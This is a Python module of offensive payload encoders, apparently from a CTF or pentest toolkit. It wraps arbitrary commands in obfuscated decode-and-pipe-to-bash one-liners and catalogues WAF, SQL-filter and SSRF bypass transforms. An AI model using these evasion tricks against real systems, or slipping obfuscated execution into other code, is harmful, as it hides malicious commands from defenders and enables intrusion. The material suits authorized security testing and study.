"""
payloads/encoders.py
────────────────────
Pure encoding and obfuscation utility functions.
No scanner state, no network I/O — import freely anywhere.

FOR AUTHORIZED SECURITY TESTING AND CTF COMPETITIONS ONLY.

Quick reference
───────────────
  from payloads.encoders import (
      b64, b64d_bash,
      hex_encode, hex_printf,
      url_encode, double_url_encode,
      html_encode, html_encode_all,
      unicode_escape, unicode_fullwidth,
      null_byte_suffix,
      comment_spaces,
      case_variations,
      obfuscate_ip,
      apply_all,
  )
"""

import base64
import codecs
import gzip
import re
import urllib.parse
from typing import Callable, Dict, List, Optional


# ──────────────────────────────────────────────────────────────────────────────
# Base-* encoding
# ──────────────────────────────────────────────────────────────────────────────

def b64(payload: str) -> str:
    """Return the raw base64 string (no decode command)."""
    return base64.b64encode(payload.encode()).decode()


def b64d_bash(payload: str) -> str:
    """Wrap payload in a base64-decode-and-pipe-to-bash one-liner."""
    return f"echo {b64(payload)} | base64 -d | bash"


def b64d_bash_compact(payload: str) -> str:
    return f"echo {b64(payload)}|base64 -d|bash"


def double_b64d_bash(payload: str) -> str:
    enc1 = base64.b64encode(payload.encode()).decode()
    enc2 = base64.b64encode(enc1.encode()).decode()
    return f"echo {enc2} | base64 -d | base64 -d | bash"


def triple_b64d_bash(payload: str) -> str:
    enc = payload.encode()
    for _ in range(3):
        enc = base64.b64encode(enc)
    return f"echo {enc.decode()} | base64 -d | base64 -d | base64 -d | bash"


def b32d_bash(payload: str) -> str:
    enc = base64.b32encode(payload.encode()).decode()
    return f"echo {enc} | base32 -d | bash"


def gzip_b64d_bash(payload: str) -> str:
    compressed = gzip.compress(payload.encode())
    enc = base64.b64encode(compressed).decode()
    return f"echo {enc} | base64 -d | gunzip | bash"


# ──────────────────────────────────────────────────────────────────────────────
# Hex encoding
# ──────────────────────────────────────────────────────────────────────────────

def hex_encode(payload: str) -> str:
    """Return hex string suitable for xxd -r -p | bash."""
    hex_str = payload.encode().hex()
    return f"echo {hex_str} | xxd -r -p | bash"


def hex_printf(payload: str) -> str:
    """Return printf '\\xNN...' | bash form."""
    hex_chars = "".join(f"\\x{b:02x}" for b in payload.encode())
    return f"printf '{hex_chars}' | bash"


def hex_string(s: str) -> str:
    """Convert a string to a 0x-prefixed hex literal (e.g. for SQL)."""
    return "0x" + s.encode().hex()


# ──────────────────────────────────────────────────────────────────────────────
# Octal encoding
# ──────────────────────────────────────────────────────────────────────────────

def octal_printf(payload: str) -> str:
    """Return printf '\\NNN...' | bash form."""
    octal_chars = "".join(f"\\{oct(b)[2:].zfill(3)}" for b in payload.encode())
    return f"printf '{octal_chars}' | bash"


# ──────────────────────────────────────────────────────────────────────────────
# URL encoding
# ──────────────────────────────────────────────────────────────────────────────

def url_encode(payload: str) -> str:
    """Percent-encode special characters."""
    return urllib.parse.quote(payload)


def url_encode_all(payload: str) -> str:
    """Percent-encode every byte."""
    return urllib.parse.quote(payload, safe="")


def double_url_encode(payload: str) -> str:
    """Double percent-encode (bypass WAF URL-decode normalisation)."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def url_encode_spaces(payload: str) -> str:
    """Replace spaces with %20."""
    return payload.replace(" ", "%20")


def url_encode_spaces_plus(payload: str) -> str:
    """Replace spaces with + (form-encoded)."""
    return payload.replace(" ", "+")


# ──────────────────────────────────────────────────────────────────────────────
# HTML / XML encoding
# ──────────────────────────────────────────────────────────────────────────────

_HTML_ENTITIES: Dict[str, str] = {
    "<":  "&lt;",
    ">":  "&gt;",
    '"':  "&quot;",
    "'":  "&#x27;",
    "&":  "&amp;",
    "/":  "&#x2F;",
    "`":  "&#x60;",
    "=":  "&#x3D;",
}

def html_encode(payload: str) -> str:
    """Encode HTML special characters to named/numeric entities."""
    result = payload
    for ch, entity in _HTML_ENTITIES.items():
        result = result.replace(ch, entity)
    return result


def html_encode_all(payload: str) -> str:
    """Encode every character as a decimal HTML entity."""
    return "".join(f"&#{ord(c)};" for c in payload)


def html_hex_encode_all(payload: str) -> str:
    """Encode every character as a hex HTML entity."""
    return "".join(f"&#x{ord(c):02x};" for c in payload)


# ──────────────────────────────────────────────────────────────────────────────
# Unicode / fullwidth tricks
# ──────────────────────────────────────────────────────────────────────────────

def unicode_escape(payload: str) -> str:
    """Return JS-style \\uXXXX unicode escapes for every character."""
    return "".join(f"\\u{ord(c):04x}" for c in payload)


def unicode_fullwidth(payload: str) -> str:
    """
    Map ASCII printable characters to their Unicode fullwidth equivalents.
    Useful for filter bypass when the WAF normalises fullwidth to ASCII.
    """
    result = []
    for c in payload:
        code = ord(c)
        if 0x21 <= code <= 0x7E:          # ! through ~
            result.append(chr(code + 0xFEE0))
        elif c == " ":
            result.append("\u3000")        # ideographic space
        else:
            result.append(c)
    return "".join(result)


# ──────────────────────────────────────────────────────────────────────────────
# String obfuscation helpers
# ──────────────────────────────────────────────────────────────────────────────

def null_byte_suffix(payload: str) -> str:
    """Append a URL-encoded null byte — may truncate at WAF but not at DB."""
    return payload + "%00"


def comment_spaces(payload: str) -> str:
    """Replace spaces with /**/ (classic SQL/WAF bypass)."""
    return payload.replace(" ", "/**/")


def comment_spaces_inline(payload: str) -> str:
    """Insert /**/ inside keywords as well (e.g. UN/**/ION)."""
    result = comment_spaces(payload)
    result = re.sub(r"(?i)\bUNION\b", "UN/**/ION", result)
    result = re.sub(r"(?i)\bSELECT\b", "SE/**/LECT", result)
    return result


def rot13(payload: str) -> str:
    """ROT-13 the payload (bash: tr 'A-Za-z' 'N-ZA-Mn-za-m')."""
    return codecs.encode(payload, "rot13")


def reverse_bash(payload: str) -> str:
    """Reverse the string, to be reversed back by `rev` in bash."""
    return f"echo '{payload[::-1]}' | rev | bash"


def case_variations(keyword: str) -> List[str]:
    """
    Return a list of case-swapped variants for a SQL/shell keyword.
    e.g. 'select' → ['SELECT', 'Select', 'sElEcT', 'SeLeCt', ...]
    """
    variants = {
        keyword.lower(),
        keyword.upper(),
        keyword.capitalize(),
    }
    # Alternating case
    variants.add("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(keyword)))
    variants.add("".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(keyword)))
    return sorted(variants)


def split_keyword_comment(keyword: str, split_at: int = 2) -> str:
    """
    Split a keyword with an inline comment to break WAF pattern matching.
    e.g. split_keyword_comment('UNION', 2) → 'UN/**/ION'
    """
    split_at = max(1, min(split_at, len(keyword) - 1))
    return keyword[:split_at] + "/**/" + keyword[split_at:]


# ──────────────────────────────────────────────────────────────────────────────
# IP obfuscation (for SSRF bypass)
# ──────────────────────────────────────────────────────────────────────────────

def obfuscate_ip(ip: str) -> Dict[str, str]:
    """
    Return a dict of alternative representations for an IPv4 address.
    Useful for SSRF filter bypass.

    Keys: hex, decimal, octal, mixed, ipv6_mapped, url_encoded
    """
    parts = [int(o) for o in ip.split(".")]

    hex_ip    = "0x" + "".join(f"{p:02x}" for p in parts)
    dec_ip    = sum(p << (8 * (3 - i)) for i, p in enumerate(parts))
    octal_ip  = ".".join(f"0{oct(p)[2:]}" for p in parts)
    mixed_ip  = f"{parts[0]}.{parts[1]}.{(parts[2] << 8) | parts[3]}"
    ipv6_map  = f"::ffff:{parts[0]:02x}{parts[1]:02x}:{parts[2]:02x}{parts[3]:02x}"
    url_enc   = url_encode(ip)

    return {
        "original":    ip,
        "hex":         hex_ip,
        "decimal":     str(dec_ip),
        "octal":       octal_ip,
        "mixed":       mixed_ip,
        "ipv6_mapped": ipv6_map,
        "url_encoded": url_enc,
    }


# ──────────────────────────────────────────────────────────────────────────────
# WAF bypass transform catalogue
# ──────────────────────────────────────────────────────────────────────────────

#: Each entry is a (label, transform_fn) tuple.
#: Apply them with apply_all() or pick individual transforms.
WAF_BYPASS_TRANSFORMS: List[tuple] = [
    ("comment_spaces",       comment_spaces),
    ("url_encode_spaces",    url_encode_spaces),
    ("url_encode_all",       url_encode_all),
    ("double_url_encode",    double_url_encode),
    ("null_byte_suffix",     null_byte_suffix),
    ("html_encode",          html_encode),
    ("html_encode_all",      html_encode_all),
    ("unicode_fullwidth",    unicode_fullwidth),
    ("b64d_bash",            b64d_bash),
    ("hex_encode",           hex_encode),
    ("hex_printf",           hex_printf),
    ("octal_printf",         octal_printf),
    ("gzip_b64d_bash",       gzip_b64d_bash),
    ("double_b64d_bash",     double_b64d_bash),
]


def apply_all(
    payload: str,
    transforms: Optional[List[tuple]] = None,
    max_results: int = 50,
) -> List[str]:
    """
    Apply every transform in *transforms* (default: WAF_BYPASS_TRANSFORMS)
    to *payload* and return the unique results, capped at *max_results*.
    """
    if transforms is None:
        transforms = WAF_BYPASS_TRANSFORMS

    results: list = [payload]
    seen: set     = {payload}

    for _label, fn in transforms:
        try:
            variant = fn(payload)
            if variant not in seen:
                seen.add(variant)
                results.append(variant)
                if len(results) >= max_results:
                    break
        except Exception:
            pass

    return results


# ──────────────────────────────────────────────────────────────────────────────
# Convenience: encode_payload() — mirrors CTFPayloadGenerator.encode_payload()
# for callers that don't need the full generator object.
# ──────────────────────────────────────────────────────────────────────────────

_ENCODING_MAP: Dict[str, Callable[[str], str]] = {
    "base64":        b64d_bash,
    "base64_compact": b64d_bash_compact,
    "hex":           hex_encode,
    "hex_printf":    hex_printf,
    "url":           url_encode,
    "double_base64": double_b64d_bash,
    "triple_base64": triple_b64d_bash,
    "gzip_base64":   gzip_b64d_bash,
    "rot13":         lambda p: f"echo '{rot13(p)}' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash",
    "octal":         octal_printf,
    "base32":        b32d_bash,
    "rev":           reverse_bash,
}

SUPPORTED_ENCODINGS: List[str] = list(_ENCODING_MAP.keys())


def encode_payload(payload: str, encoding: str = "base64") -> str:
    """
    Encode *payload* using the named technique.

    Supported: base64, base64_compact, hex, hex_printf, url,
               double_base64, triple_base64, gzip_base64,
               rot13, octal, base32, rev.

    Falls back to the original string for unknown encoding names.
    """
    fn = _ENCODING_MAP.get(encoding)
    if fn is None:
        return payload
    return fn(payload)
